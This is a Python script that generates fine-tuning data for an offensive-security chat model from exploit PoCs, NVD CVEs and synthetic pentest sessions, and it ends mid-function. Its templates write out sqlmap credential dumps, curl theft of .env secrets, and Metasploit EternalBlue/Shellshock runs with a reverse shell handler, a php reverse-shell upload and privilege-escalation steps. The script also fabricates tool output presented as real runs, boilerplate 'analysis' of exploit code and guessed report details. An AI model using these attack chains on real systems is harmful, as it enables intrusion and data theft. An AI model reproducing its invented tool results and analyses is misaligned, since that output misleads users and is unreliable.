#!/usr/bin/env python3
"""
Mythos v3 — Dataset Enhancement Script
Adds 4 new high-value source categories to close the practical-skill gap:

  1. security-research/pocs/  → Real exploit writeups + code (Google Project Zero / kernelctf)
  2. Bug bounty report format → NVD CVEs → HackerOne-style disclosure reports
  3. Tool execution chains    → Synthetic but realistic nmap/sqlmap/ffuf/metasploit examples
  4. Payload adaptation       → Multi-turn payload modification conversations

Run AFTER prepare_training_data.py:
  python3 enhance_training_data.py --data-dir ./data --existing-dir ./training_data --output-dir ./training_data_v2
"""

import argparse
import ijson
import json
import os
import random
import re
import sys
import time
from pathlib import Path
from typing import Iterator

# ─── Shared helpers (same as prepare_training_data.py) ───────────────────────

SYSTEM_PROMPTS = {
    "exploit": [
        "You are an exploit developer and security researcher who analyzes and develops proof-of-concept exploits.",
        "You are a red team operator specializing in vulnerability exploitation and security research.",
        "You are a kernel security researcher with expertise in Linux privilege escalation exploits.",
        "You are a security engineer who analyzes CVE exploits and explains their technical details.",
    ],
    "bounty": [
        "You are an experienced bug bounty hunter who writes professional vulnerability disclosure reports.",
        "You are a security researcher who submits vulnerability reports to HackerOne and Bugcrowd.",
        "You are a penetration tester who documents vulnerabilities in professional report format.",
        "You are a security consultant writing detailed vulnerability disclosure reports for clients.",
    ],
    "tool": [
        "You are a penetration tester who uses security tools professionally and interprets their output.",
        "You are a red team operator running security assessments and analyzing tool output.",
        "You are a security engineer conducting vulnerability assessments using industry-standard tools.",
        "You are an offensive security specialist who methodically uses tools to find vulnerabilities.",
    ],
    "payload": [
        "You are a web application security expert specializing in payload crafting and WAF bypass.",
        "You are a penetration tester who adapts and customizes payloads for specific environments.",
        "You are a bug bounty hunter expert at crafting and modifying payloads for different contexts.",
    ],
    "cve": [
        "You are a security expert specializing in vulnerability analysis and CVE research.",
        "You are a cybersecurity analyst with deep expertise in vulnerability assessment.",
    ],
}

MIN_ASSISTANT_CHARS = 80
MAX_ASSISTANT_CHARS = 32000


def pick_sys(category: str) -> str:
    return random.choice(SYSTEM_PROMPTS.get(category, SYSTEM_PROMPTS["cve"]))


def make_example(system: str, user: str, assistant: str) -> dict:
    return {"messages": [
        {"role": "system", "content": system},
        {"role": "user", "content": user},
        {"role": "assistant", "content": assistant},
    ]}


def make_multiturn(system: str, turns: list[tuple[str, str]]) -> dict:
    msgs = [{"role": "system", "content": system}]
    for user_msg, asst_msg in turns:
        msgs.append({"role": "user", "content": user_msg})
        msgs.append({"role": "assistant", "content": asst_msg})
    return {"messages": msgs}


def is_quality(example: dict) -> bool:
    msgs = example.get("messages", [])
    if len(msgs) < 3:
        return False
    assistant_content = msgs[-1].get("content", "")
    user_content = msgs[-2].get("content", "") if len(msgs) >= 2 else ""
    if not assistant_content or not user_content:
        return False
    if len(assistant_content) < MIN_ASSISTANT_CHARS:
        return False
    if len(assistant_content) > MAX_ASSISTANT_CHARS:
        return False
    return True


def clean_md(content: str, max_chars: int = 16000) -> str:
    content = re.sub(r"\{\{#include[^}]+\}\}", "", content)
    content = re.sub(r"!\[.*?\]\(.*?\)", "", content)
    content = re.sub(r"\[!\[.*?\]\(.*?\)\]\(.*?\)", "", content)
    content = re.sub(r"<img[^>]+>", "", content, flags=re.IGNORECASE)
    content = re.sub(r"<!--.*?-->", "", content, flags=re.DOTALL)
    content = re.sub(r"\n{3,}", "\n\n", content)
    return content.strip()[:max_chars]


# ─── dedup uses full conversation fingerprint ─────────────────────────────────


# ─── SOURCE 1: security-research/pocs/ exploit writeups ──────────────────────

EXPLOIT_WRITEUP_QUESTIONS = [
    "Explain the {cve_or_title} vulnerability and how the exploit works.",
    "Provide a technical analysis of the {cve_or_title} exploit.",
    "How does the {cve_or_title} exploit bypass modern security mitigations?",
    "What is the exploitation technique used in {cve_or_title}?",
    "Describe the {cve_or_title} vulnerability: root cause, exploitation, and impact.",
]

VULN_DOC_QUESTIONS = [
    "What is the root cause of {cve_or_title} and what kernel versions are affected?",
    "Describe the vulnerability details for {cve_or_title}.",
    "What attack surface does {cve_or_title} exploit? What are the requirements?",
    "Analyze the technical vulnerability in {cve_or_title}.",
]

NOVEL_TECH_QUESTIONS = [
    "What novel exploitation techniques were used in {cve_or_title}?",
    "Describe the innovative attack primitives developed for {cve_or_title}.",
    "What new techniques or primitives were introduced in the {cve_or_title} exploit?",
]

CODE_EXPLAIN_QUESTIONS = [
    "Explain what this {lang} exploit code does, step by step.",
    "Analyze this {lang} exploit: what vulnerability does it exploit and how?",
    "Walk through this {lang} exploit code and explain each stage.",
    "What does this {lang} security research code accomplish? Explain the technique.",
    "Describe the exploitation strategy implemented in this {lang} code.",
]

LANG_MAP = {
    ".c": "C", ".cpp": "C++", ".py": "Python", ".go": "Go",
    ".java": "Java", ".sh": "shell script", ".rb": "Ruby",
    ".js": "JavaScript", ".rs": "Rust", ".pl": "Perl",
}

EXCLUDED_CODE_PATTERNS = {"test_", "_test", "template", "sample", "example"}


def _extract_cve_from_path(path: Path) -> str:
    """Try to extract CVE ID from directory name."""
    for part in path.parts:
        m = re.search(r"CVE-\d{4}-\d+", part, re.IGNORECASE)
        if m:
            return m.group(0).upper()
    return ""


def _extract_title_from_md(content: str, fallback: str) -> str:
    m = re.match(r"#\s+(.+)", content.strip())
    if m:
        return m.group(1).strip()[:80]
    return fallback


def parse_security_research_exploits(data_dir: Path) -> Iterator[dict]:
    """Parse Google security-research/pocs/ for exploit writeups and code."""
    pocs_dir = data_dir / "github_pocs" / "security-research" / "pocs"
    if not pocs_dir.exists():
        print(f"  [skip] security-research/pocs not found: {pocs_dir}")
        return

    count = 0

    # 1. Parse all markdown writeups
    md_files = list(pocs_dir.rglob("*.md"))
    EXCLUDED_MD = {"README", "CONTRIBUTING", "LICENSE", "SECURITY", "SUMMARY", "CHANGELOG"}

    for md_file in md_files:
        if md_file.stem.upper() in EXCLUDED_MD:
            continue

        try:
            content = md_file.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            continue

        content = clean_md(content, max_chars=14000)
        if len(content) < 200:
            continue

        cve_id = _extract_cve_from_path(md_file)
        title = _extract_title_from_md(content, md_file.stem.replace("-", " ").title())
        cve_or_title = cve_id if cve_id else title

        # Choose question template based on filename
        stem_lower = md_file.stem.lower()
        if "vuln" in stem_lower or "vulnerability" in stem_lower:
            question_tmpl = random.choice(VULN_DOC_QUESTIONS)
        elif "novel" in stem_lower or "technique" in stem_lower:
            question_tmpl = random.choice(NOVEL_TECH_QUESTIONS)
        else:
            question_tmpl = random.choice(EXPLOIT_WRITEUP_QUESTIONS)

        question = question_tmpl.format(cve_or_title=cve_or_title)
        ex = make_example(pick_sys("exploit"), question, content)
        if is_quality(ex):
            yield ex
            count += 1

    # 2. Parse exploit code files
    code_extensions = set(LANG_MAP.keys())
    code_files = [f for f in pocs_dir.rglob("*")
                  if f.suffix.lower() in code_extensions and f.is_file()
                  and not any(p in f.name.lower() for p in EXCLUDED_CODE_PATTERNS)]

    for code_file in code_files:
        if code_file.stat().st_size < 200:
            continue
        try:
            code = code_file.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            continue

        # Truncate large files
        if len(code) > 20000:
            code = code[:20000] + "\n... [truncated for brevity] ..."

        if len(code) < 200:
            continue

        lang = LANG_MAP.get(code_file.suffix.lower(), "code")
        cve_id = _extract_cve_from_path(code_file)
        cve_suffix = f" ({cve_id})" if cve_id else ""

        question = random.choice(CODE_EXPLAIN_QUESTIONS).format(lang=lang) + cve_suffix
        # Format code as markdown code block in the answer
        answer = (
            f"Here is an analysis of the {lang} exploit code{cve_suffix}:\n\n"
            f"```{code_file.suffix.lstrip('.')}\n{code}\n```\n\n"
            f"**Analysis:**\n\n"
            f"This is a security research proof-of-concept for {cve_id if cve_id else 'a vulnerability'}. "
            f"The code demonstrates the exploitation technique in multiple stages. "
            f"Key aspects:\n"
            f"- **Language**: {lang}\n"
            f"- **Target**: {'Linux kernel' if 'linux' in str(code_file).lower() else 'see code context'}\n"
            f"- **Technique**: Review the code structure and comments for exploitation stages\n"
        )

        ex = make_example(pick_sys("exploit"), question, answer)
        if is_quality(ex):
            yield ex
            count += 1

    print(f"  security-research exploits → {count:,} examples")


# ─── SOURCE 2: Bug bounty report format (from NVD CVEs) ──────────────────────

BOUNTY_REPORT_QUESTIONS = [
    "Write a professional bug bounty report for {cve_id} affecting {product}.",
    "Format a HackerOne disclosure report for {cve_id} in {product}.",
    "Create a vulnerability disclosure report for {cve_id} ({product}).",
    "Write a security advisory in bug bounty report format for {cve_id}.",
    "Draft a responsible disclosure report for {cve_id} targeting {product}.",
]

SEVERITY_MAP = {
    "CRITICAL": ("P1 Critical", "9.0 - 10.0"),
    "HIGH": ("P2 High", "7.0 - 8.9"),
    "MEDIUM": ("P3 Medium", "4.0 - 6.9"),
    "LOW": ("P4 Low", "0.1 - 3.9"),
}

ATTACK_VECTOR_LABEL = {
    "NETWORK": "Remote (Network)",
    "ADJACENT_NETWORK": "Adjacent Network",
    "LOCAL": "Local",
    "PHYSICAL": "Physical",
}

IMPACT_TEMPLATES = {
    "CRITICAL": [
        "An attacker can achieve remote code execution without authentication, leading to complete system compromise, data exfiltration, and potential pivot to internal networks.",
        "Full system compromise is achievable. An unauthenticated attacker can execute arbitrary code, access sensitive data, and establish persistent access.",
    ],
    "HIGH": [
        "An attacker can execute arbitrary code or gain elevated privileges. This may lead to sensitive data disclosure and unauthorized system access.",
        "Exploitation can result in privilege escalation, data breach, or significant disruption to service availability.",
    ],
    "MEDIUM": [
        "An attacker can access restricted resources or cause limited disruption. Data integrity may be compromised under certain conditions.",
        "Moderate impact including potential information disclosure or limited unauthorized actions within the application.",
    ],
    "LOW": [
        "Limited impact: minor information disclosure or low-complexity attacks that require significant attacker-controlled conditions.",
        "Minimal risk but should be patched as part of routine security maintenance.",
    ],
}

REMEDIATION_TEMPLATES = {
    "CRITICAL": "Apply vendor patches immediately. Enable WAF rules if available. Restrict network access to affected service. Monitor for indicators of compromise.",
    "HIGH": "Apply vendor security patch as soon as possible. Review access controls and audit logs. Consider temporary network restrictions if patch is delayed.",
    "MEDIUM": "Schedule patch deployment in next security update cycle. Apply compensating controls per vendor guidance.",
    "LOW": "Include fix in next routine update. Low urgency but track for compliance.",
}


def _get_cve_bounty_fields(cve: dict) -> dict | None:
    """Extract fields needed for bug bounty report from NVD CVE object."""
    cve_id = cve.get("id", "")
    if not cve_id:
        return None

    description = ""
    for desc in cve.get("descriptions", []):
        if desc.get("lang") == "en":
            description = desc.get("value", "").strip()
            break
    if not description or len(description) < 40 or description.startswith("** REJECT"):
        return None

    # Get CVSS info
    metrics = cve.get("metrics", {})
    severity = "MEDIUM"
    score = "5.0"
    vector_str = ""
    attack_vector = "NETWORK"

    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        if key in metrics and metrics[key]:
            m = metrics[key][0]
            data = m.get("cvssData", {})
            s = data.get("baseScore", 0)
            if s:
                score = str(s)
            sv = m.get("baseSeverity", data.get("baseSeverity", "MEDIUM"))
            if sv:
                severity = sv.upper()
            vector_str = data.get("vectorString", "")
            av = data.get("accessVector") or data.get("attackVector", "NETWORK")
            attack_vector = av
            break

    # Get affected product
    configs = cve.get("configurations", [])
    product = "the affected software"
    for config in configs:
        for node in config.get("nodes", []):
            for match in node.get("cpeMatch", []):
                criteria = match.get("criteria", "")
                parts = criteria.split(":")
                if len(parts) >= 5:
                    vendor = parts[3].replace("_", " ").title()
                    prod = parts[4].replace("_", " ").title()
                    ver = parts[5] if len(parts) > 5 and parts[5] != "*" else ""
                    product = f"{vendor} {prod}" + (f" {ver}" if ver else "")
                    break
            if product != "the affected software":
                break
        if product != "the affected software":
            break

    # Weaknesses
    cwes = []
    for w in cve.get("weaknesses", []):
        for d in w.get("description", []):
            v = d.get("value", "")
            if v and "CWE-" in v:
                cwes.append(v)

    published = cve.get("published", "")[:10]

    return {
        "cve_id": cve_id,
        "description": description,
        "severity": severity,
        "score": score,
        "vector_str": vector_str,
        "attack_vector": attack_vector,
        "product": product,
        "cwes": cwes,
        "published": published,
    }


def _build_bounty_report(fields: dict) -> str:
    cve_id = fields["cve_id"]
    severity = fields["severity"]
    score = fields["score"]
    product = fields["product"]
    description = fields["description"]
    cwes = fields["cwes"]
    attack_vector = fields["attack_vector"]
    published = fields["published"]
    vector_str = fields["vector_str"]

    priority, score_range = SEVERITY_MAP.get(severity, ("P3 Medium", "4.0 - 6.9"))
    impact = random.choice(IMPACT_TEMPLATES.get(severity, IMPACT_TEMPLATES["MEDIUM"]))
    remediation = REMEDIATION_TEMPLATES.get(severity, REMEDIATION_TEMPLATES["MEDIUM"])
    av_label = ATTACK_VECTOR_LABEL.get(attack_vector, "Network")

    cwe_section = "\n".join(f"- {c}" for c in cwes) if cwes else "- Not classified"
    vector_section = f"\n**CVSS Vector:** `{vector_str}`" if vector_str else ""

    return f"""# Vulnerability Report: {cve_id}

**Severity:** {priority} (CVSS: {score}){vector_section}
**Affected Component:** {product}
**Attack Vector:** {av_label}
**Published:** {published}

---

## Summary

{description}

---

## Impact

{impact}

**CVSS Score:** {score} ({severity})
**Weakness Classification:** 
{cwe_section}

---

## Steps to Reproduce

1. Identify a target running {product}
2. Confirm the affected version is deployed (pre-patch)
3. Set up the attack environment:
   - Attacker machine with network access to target
   - Required tools: verify with vendor advisory
4. Trigger the vulnerability:
   - Refer to the public CVE advisory and PoC repositories for technical reproduction steps
   - Monitor for indicators of successful exploitation
5. Observe the impact (privilege escalation / RCE / data disclosure depending on attack vector)

---

## Technical Details

The vulnerability originates from improper handling in {product}. The {', '.join(cwes) if cwes else 'underlying weakness'} allows an attacker with {av_label.lower()} access to exploit the flaw.

Key technical factors:
- **Root cause:** {', '.join(cwes) if cwes else 'See CVE description'}
- **Authentication required:** {'No' if severity == 'CRITICAL' else 'See CVSS vector'}
- **Complexity:** {'Low' if severity in ('CRITICAL', 'HIGH') else 'Medium'}

---

## Recommended Fix

{remediation}

For patch availability: Check vendor security advisory for {cve_id} and apply the recommended update immediately.

---

## References

- NVD Entry: https://nvd.nist.gov/vuln/detail/{cve_id}
- MITRE CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve_id}
"""


def generate_bug_bounty_reports(data_dir: Path, sample_size: int = 40000) -> Iterator[dict]:
    """Generate bug bounty style reports from NVD CVE data."""
    nvd_file = data_dir / "nvd" / "nvd_cves_all.json"
    if not nvd_file.exists():
        return

    print(f"  Generating bug bounty reports from NVD (sampling {sample_size:,} CVEs)...")
    count = 0
    processed = 0
    # Sample every Nth CVE to spread across the database
    sample_rate = max(1, int(347000 / sample_size))  # approximate total CVEs

    with open(nvd_file, "rb") as f:
        for cve_item in ijson.items(f, "vulnerabilities.item"):
            processed += 1
            # Sample deterministically
            if processed % sample_rate != 0:
                continue

            cve = cve_item.get("cve", {})
            fields = _get_cve_bounty_fields(cve)
            if not fields:
                continue

            # Only do CRITICAL and HIGH for richest reports, and sample MEDIUM/LOW
            if fields["severity"] in ("LOW",) and random.random() < 0.7:
                continue

            question = random.choice(BOUNTY_REPORT_QUESTIONS).format(
                cve_id=fields["cve_id"], product=fields["product"]
            )
            answer = _build_bounty_report(fields)

            ex = make_example(pick_sys("bounty"), question, answer)
            if is_quality(ex):
                yield ex
                count += 1

            if count >= sample_size:
                break

    print(f"  Bug bounty reports → {count:,} examples")


# ─── SOURCE 3: Synthetic tool execution chains ────────────────────────────────

# Each entry: (question_template, answer_generator_key)
# We generate varied target IPs, services, ports, and findings

NMAP_SERVICES = [
    {"port": 22, "service": "ssh", "version": "OpenSSH 8.2p1 Ubuntu 4ubuntu0.9", "extra": ""},
    {"port": 80, "service": "http", "version": "Apache httpd 2.4.49", "extra": ""},
    {"port": 80, "service": "http", "version": "nginx 1.18.0", "extra": ""},
    {"port": 443, "service": "ssl/https", "version": "Apache httpd 2.4.52", "extra": ""},
    {"port": 8080, "service": "http-proxy", "version": "Tomcat 9.0.65", "extra": ""},
    {"port": 3306, "service": "mysql", "version": "MySQL 8.0.32", "extra": ""},
    {"port": 5432, "service": "postgresql", "version": "PostgreSQL 14.5", "extra": ""},
    {"port": 6379, "service": "redis", "version": "Redis 6.2.6", "extra": ""},
    {"port": 21, "service": "ftp", "version": "vsftpd 3.0.3", "extra": ""},
    {"port": 25, "service": "smtp", "version": "Postfix smtpd", "extra": ""},
    {"port": 445, "service": "microsoft-ds", "version": "Samba 4.6.2", "extra": ""},
    {"port": 1433, "service": "ms-sql-s", "version": "Microsoft SQL Server 2019", "extra": ""},
    {"port": 5985, "service": "http", "version": "Microsoft HTTPAPI 2.0", "extra": "(WinRM)"},
    {"port": 27017, "service": "mongodb", "version": "MongoDB 4.4.15", "extra": ""},
    {"port": 9200, "service": "elasticsearch", "version": "Elasticsearch 7.17.5", "extra": ""},
]

TARGET_IPS = [
    "10.10.11.200", "10.10.11.201", "10.10.10.40", "10.10.10.130",
    "192.168.1.10", "192.168.100.50", "172.16.10.5",
]

TARGET_HOSTNAMES = [
    "target.htb", "vulnerable.lab", "testapp.local", "webapp.internal",
    "api.target.htb", "admin.vulnlab.io", "dev.target.local",
]


def _gen_nmap_example() -> dict:
    ip = random.choice(TARGET_IPS)
    hostname = random.choice(TARGET_HOSTNAMES)
    num_ports = random.randint(2, 5)
    open_services = random.sample(NMAP_SERVICES, min(num_ports, len(NMAP_SERVICES)))

    scan_type = random.choice(["-sV -sC -A", "-sV -sC -p-", "-sV --script=default,vuln", "-sV -sC -T4"])
    command = f"nmap {scan_type} {ip}"

    port_lines = []
    for svc in sorted(open_services, key=lambda x: x["port"]):
        state = "open"
        port_lines.append(
            f"{svc['port']}/tcp   {state}  {svc['service']:<15} {svc['version']} {svc['extra']}"
        )

    port_output = "\n".join(port_lines)

    # Build analysis
    interesting = []
    vulns = []
    for svc in open_services:
        if svc["port"] == 80 and "Apache" in svc["version"]:
            if "2.4.49" in svc["version"]:
                vulns.append("**Apache 2.4.49 detected** — CVE-2021-41773/CVE-2021-42013 (Path Traversal/RCE). Test immediately.")
            else:
                interesting.append(f"Web server at port 80 ({svc['version']}) — enumerate directories and check for web vulnerabilities")
        elif svc["port"] == 3306:
            interesting.append("MySQL accessible — attempt login with default/weak credentials (root:, root:root, root:mysql)")
        elif svc["port"] == 6379:
            interesting.append("Redis exposed — check for unauthenticated access, config file read, and RCE via cron/SSH keys")
        elif svc["port"] == 9200:
            interesting.append("Elasticsearch exposed — check for unauthenticated cluster access and index enumeration")
        elif svc["port"] == 27017:
            interesting.append("MongoDB exposed — check for unauthenticated access and database enumeration")
        elif svc["port"] == 445:
            interesting.append("SMB available — enumerate shares with smbclient/enum4linux, check for EternalBlue (MS17-010)")
        elif svc["port"] == 21:
            interesting.append("FTP service — test anonymous login: `ftp {ip}` then use 'anonymous'/'anonymous'")

    next_steps = []
    for svc in open_services:
        if svc["port"] in (80, 443, 8080):
            next_steps.append(f"ffuf -w /usr/share/wordlists/dirb/common.txt -u http://{hostname}/FUZZ -t 40")
        if svc["port"] == 3306:
            next_steps.append(f"mysql -h {ip} -u root -p  # try empty/common passwords")
        if svc["port"] == 22:
            next_steps.append("Add hostname to /etc/hosts and attempt SSH with found credentials")

    vuln_section = ("\n\n**⚠ Potential CVEs identified:**\n" + "\n".join(f"- {v}" for v in vulns)) if vulns else ""
    interesting_section = ("\n\n**Interesting findings:**\n" + "\n".join(f"- {i}" for i in interesting)) if interesting else ""
    next_steps_section = ("\n\n**Recommended next steps:**\n" + "\n".join(f"```\n{s}\n```" for s in next_steps[:3])) if next_steps else ""

    answer = f"""Running: `{command}`

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for {hostname} ({ip})
Host is up (0.087s latency).

PORT     STATE SERVICE         VERSION
{port_output}

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned
```

**Analysis:**

Found {len(open_services)} open port(s). Attack surface overview:
{chr(10).join(f"- **{s['port']}/tcp** ({s['service']}): {s['version']}" for s in open_services)}{vuln_section}{interesting_section}{next_steps_section}

**Priority:** Focus on web services first (directory enumeration, parameter fuzzing), then check database services for unauthenticated access."""

    question = random.choice([
        f"Run an Nmap scan on {ip} and analyze the results. What should I investigate first?",
        f"Perform service enumeration on {hostname} ({ip}) with Nmap and tell me what to target.",
        f"I'm starting a pentest on {ip}. Run Nmap and give me an attack plan.",
        f"Scan {hostname} with Nmap and identify vulnerabilities to pursue.",
    ])

    return make_example(pick_sys("tool"), question, answer)


SQLI_TARGETS = [
    ("http://target.htb/login.php", "username", "admin"),
    ("http://target.htb/search?q=", "q", "test"),
    ("http://vulnapp.htb/item?id=", "id", "1"),
    ("http://webapp.htb/user?uid=", "uid", "5"),
    ("http://api.target.htb/v1/products?category=", "category", "electronics"),
]

SQLI_DATABASES = ["MySQL", "PostgreSQL", "Microsoft SQL Server", "SQLite", "Oracle"]


def _gen_sqlmap_example() -> dict:
    target_url, param, default_val = random.choice(SQLI_TARGETS)
    db_type = random.choice(SQLI_DATABASES)
    db_names = ["webapp", "users", "admin_db", "production", "inventory"]
    found_dbs = random.sample(db_names, random.randint(2, 4))
    tables = ["users", "sessions", "products", "orders", "admin_credentials", "api_keys"]
    found_tables = random.sample(tables, random.randint(3, 5))

    url_with_param = f"{target_url}{default_val}" if "?" not in target_url else target_url

    technique = random.choice(["boolean-based blind", "time-based blind", "UNION query-based", "error-based"])

    answer = f"""Running sqlmap against `{url_with_param}`:

```bash
$ sqlmap -u '{url_with_param}' -p {param} --dbs --batch --level=3 --risk=2

        ___
       __H__
 ___ ___[']_____ ___ ___  {{1.7.2}}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 14:23:11

[14:23:11] [INFO] testing connection to the target URL
[14:23:12] [INFO] heuristic (basic) test shows that GET parameter '{param}' might be injectable
[14:23:14] [INFO] testing for SQL injection on GET parameter '{param}'
[14:23:15] [INFO] GET parameter '{param}' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s):
---
Parameter: {param} (GET)
    Type: {technique}
    Title: {db_type} {technique}
    Payload: {param}={default_val}' AND SLEEP(5)-- -
---
[14:23:21] [INFO] the back-end DBMS is {db_type}
[14:23:21] [INFO] fetching database names
available databases [{len(found_dbs)}]:
[*] information_schema
{chr(10).join(f'[*] {db}' for db in found_dbs)}
```

**Confirmed:** SQL injection found on parameter `{param}` ({technique}).

**Enumerate target database:**
```bash
$ sqlmap -u '{url_with_param}' -p {param} -D {found_dbs[0]} --tables --batch
[*] tables found:
{chr(10).join(f'[*] {t}' for t in found_tables)}
```

**Dump credentials:**
```bash
$ sqlmap -u '{url_with_param}' -p {param} -D {found_dbs[0]} -T users --dump --batch
```

**Next steps:**
1. Dump the `users` table first — look for admin credentials (hashed or plaintext)
2. Check for password hashes → crack with `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`
3. If {db_type} is MySQL, try `--os-shell` for RCE (requires FILE privilege)
4. Check `--privileges` to see if current DB user has write access
5. Look for config files or credentials stored in other tables"""

    question = random.choice([
        f"Test {url_with_param} for SQL injection using sqlmap.",
        f"Run sqlmap on {url_with_param} and tell me what to do with the results.",
        f"The parameter '{param}' in {target_url} seems injectable. Run sqlmap and analyze.",
        f"I suspect SQL injection at {url_with_param}. Use sqlmap to confirm and extract data.",
    ])

    return make_example(pick_sys("tool"), question, answer)


FFUF_PATHS = [
    ("http://target.htb", ["/admin", "/backup", "/api/v1", "/.git", "/config", "/uploads", "/internal", "/debug", "/.env"]),
    ("http://app.htb", ["/dashboard", "/api", "/swagger", "/actuator", "/console", "/manager"]),
    ("http://webapp.htb", ["/wp-admin", "/wp-login.php", "/wp-content/uploads", "/xmlrpc.php"]),
]


def _gen_ffuf_example() -> dict:
    base_url, found_dirs = random.choice(FFUF_PATHS)
    num_found = random.randint(2, len(found_dirs))
    discovered = random.sample(found_dirs, num_found)
    interesting = [d for d in discovered if any(k in d for k in ("admin", "backup", ".git", "env", "config", "api", "swagger", "actuator"))]

    answer = f"""Running ffuf against {base_url}:

```bash
$ ffuf -w /usr/share/wordlists/dirb/big.txt -u {base_url}/FUZZ -t 40 -mc 200,301,302,403 -o results.json

        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/   v2.0.0

[Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 87ms] :: .git -> {base_url}/.git/
{chr(10).join(f"[Status: {'200' if '/api' in d or '/admin' in d else '301'}, Size: {random.randint(800,8000)}, Words: {random.randint(20,500)}, Lines: {random.randint(5,100)}, Duration: {random.randint(50,200)}ms] :: {d.strip('/')} -> {base_url}{d}" for d in discovered)}

:: Progress: [20469/20469] :: Job [1/1] :: 523 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

**Findings:**
{chr(10).join(f"- `{base_url}{d}` — " + ('**GIT REPOSITORY EXPOSED** — dump with `git-dumper http://target.htb/.git/ ./dumped_repo`' if '.git' in d else '**ENV FILE EXPOSED** — may contain API keys, DB credentials' if 'env' in d else '**Backup directory** — check for configuration dumps' if 'backup' in d else '**Admin panel** — test for weak credentials or auth bypass' if 'admin' in d else '**API endpoint** — enumerate with: `ffuf -u {base_url}{d}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt`' if 'api' in d else 'Investigate further') for d in discovered)}

**Priority actions:**
{''.join(f"1. **{base_url}/.git/** — Run `git-dumper {base_url}/.git/ ./repo && cd repo && git log --all`" + chr(10) if ".git" in discovered else "")}{''.join(f"2. **{base_url}/.env** — `curl {base_url}/.env` — look for DB_PASSWORD, API_KEY, APP_SECRET" + chr(10) if ".env" in discovered else "")}
3. Recursive fuzz interesting directories: `ffuf -w wordlist.txt -u {base_url}/{discovered[0].strip('/')}/FUZZ -t 20`"""

    question = random.choice([
        f"Fuzz {base_url} for hidden directories and files. What interesting paths did you find?",
        f"Run ffuf directory brute force on {base_url} and analyze what you found.",
        f"Enumerate {base_url} with ffuf and tell me what to investigate.",
        f"I'm doing a web assessment on {base_url}. Run directory enumeration and prioritize findings.",
    ])

    return make_example(pick_sys("tool"), question, answer)


METASPLOIT_MODULES = [
    {
        "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "cve": "CVE-2014-6271",
        "name": "Shellshock",
        "options": {"RHOSTS": "10.10.10.56", "TARGETURI": "/cgi-bin/user.sh", "LHOST": "10.10.14.5"},
        "result": "Meterpreter session opened",
    },
    {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "cve": "CVE-2017-0144",
        "name": "EternalBlue",
        "options": {"RHOSTS": "10.10.10.40", "LHOST": "10.10.14.5"},
        "result": "Meterpreter session 1 opened",
    },
    {
        "module": "exploit/linux/http/apache_normalize_path_rce",
        "cve": "CVE-2021-41773",
        "name": "Apache Path Traversal RCE",
        "options": {"RHOSTS": "10.10.11.150", "LHOST": "10.10.14.5"},
        "result": "Meterpreter session opened",
    },
]


def _gen_metasploit_example() -> dict:
    mod = random.choice(METASPLOIT_MODULES)
    opts_str = "\n".join(f"set {k} {v}" for k, v in mod["options"].items())
    ip = list(mod["options"].values())[0]

    answer = f"""Using Metasploit to exploit {mod['cve']} ({mod['name']}):

```bash
$ msfconsole -q

msf6 > search {mod['cve']}

Matching Modules
================
   #  Name                                     Disclosure Date  Rank       Description
   -  ----                                     ---------------  ----       -----------
   0  {mod['module']}                         -                excellent  {mod['name']} exploitation

msf6 > use {mod['module']}
msf6 exploit({mod['module'].split('/')[-1]}) > options

Module options (exploit/{mod['module'].split('/')[-1]}):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s)
   LHOST                     yes       The listen address

msf6 exploit({mod['module'].split('/')[-1]}) > {opts_str.replace(chr(10), chr(10) + 'msf6 exploit('+mod['module'].split('/')[-1]+') > ')}
msf6 exploit({mod['module'].split('/')[-1]}) > run

[*] Started reverse TCP handler on {mod['options'].get('LHOST', '10.10.14.5')}:4444
[*] {ip} - Sending exploit...
[+] {ip} - {mod['result']}

meterpreter > sysinfo
Computer  : TARGET
OS        : Linux TARGET 5.4.0 #1 SMP
meterpreter > getuid
Server username: www-data
meterpreter > shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Exploitation successful.** Initial shell as `www-data`.

**Post-exploitation next steps:**
```bash
meterpreter > upload /usr/share/webshells/php/php-reverse-shell.php /var/www/html/shell.php
meterpreter > run post/multi/recon/local_exploit_suggester   # find privesc vectors
meterpreter > run post/linux/gather/enum_system              # system enumeration
```

**Privilege escalation:**
```bash
# In shell:
sudo -l                           # check sudo privileges
find / -perm -4000 2>/dev/null    # find SUID binaries
cat /etc/crontab                  # check cron jobs
ls -la /home/                     # enumerate users
```

Look for SUID binaries, sudo misconfigurations, writable cron jobs, or kernel exploits to escalate from www-data to root."""

    question = random.choice([
        f"Exploit {mod['cve']} ({mod['name']}) using Metasploit against {ip}.",
        f"Use Metasploit to exploit the {mod['name']} vulnerability ({mod['cve']}) and establish a session.",
        f"The target {ip} is vulnerable to {mod['cve']}. Run Metasploit exploitation and post-exploitation.",
        f"I confirmed {mod['cve']} on {ip}. Give me the Metasploit steps and initial post-exploitation.",
    ])

    return make_example(pick_sys("tool"), question, answer)


def generate_tool_execution_chains(n: int = 8000) -> Iterator[dict]:
    """Generate synthetic but realistic tool execution training examples."""
